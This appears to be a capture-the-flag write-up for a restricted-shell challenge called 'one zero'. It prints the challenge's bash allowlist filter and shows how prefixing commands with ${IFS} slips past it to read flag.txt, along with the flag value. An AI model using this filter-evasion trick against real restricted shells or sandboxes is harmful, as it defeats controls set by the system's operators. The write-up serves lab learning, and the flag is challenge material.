>Author: @JohnHammond#6971  
>  
>You only get one zero. ;)
------------------------------
#### _NOTE_, *This solution utilizes an unintended interaction*.

We are given a file to see the restrictions placed. Once we are ready to give it a try, we ssh to their designated port.

```bash
shopt -s extdebug
function one_zero() {
    if [[ "$BASH_COMMAND" =~ ^[\$\&+:\;=\?@\#|\<\>.\^\*()\%\!0-]+ ]]; then
        num_zero=$(awk '{print gsub(/0/, "")}' <<< "$BASH_COMMAND")
        if [[ $num_zero -le 1 ]]; then
            return; 
        else
            echo "You are only allowed one zero. :)"
            return 1;
        fi
    fi
    echo "Sorry, you used a character that is not in the allowlist!"
    return 1;
}

trap 'one_zero' DEBUG
```

We can see there is a very strict character on the allowlist, but also that more than 1 zero and we trip the 2nd if statement, telling us only 1 zero allowed.

Jumping right in I learned that we can still pass env variables:
```bash
user@one_zero:~$ $TERM
bash: xterm-256color: command not found
user@one_zero:~$ $HOME
bash: /home/user: Is a directory
```
In these cases, I don't even need my precious zero! But what to do with them? The answer is not so clear.
Next I found that I can append letter characters after a zero, and I still bypass the allowlist:
```bash
user@one_zero:~$ 0whoami
bash: 0whoami: command not found
```
So far nothing is workable. After attempting some other additional operators:
```bash
user@one_zero:~$ 0||whoami
bash: 0: command not found
Sorry, you used a character that is not in the allowlist!
```

My operators are not exactly blacklisted, but being 2 separate commands still goes through the allowlist check, which my whoami inevitably fails.

I know the bash special variable `$IFS` is known to be rather effective at bypassing some tricky filter settings, so I decided to try it out here and see what happens:

```bash
user@one_zero:~$ ${IFS}whoami
user
user@one_zero:~$ ${IFS}ls
flag.txt
```

In an unexpected twist, it appears using $IFS at the start of the command results in any subsequent input bypassing the filter!
From here it's a simple `cat` away:

```bash
user@one_zero:~$ ${IFS}cat flag.txt
flag{81b9de37f5bd218c9f59ac2d9d709bf6}
```

- Author : LazyTitan33
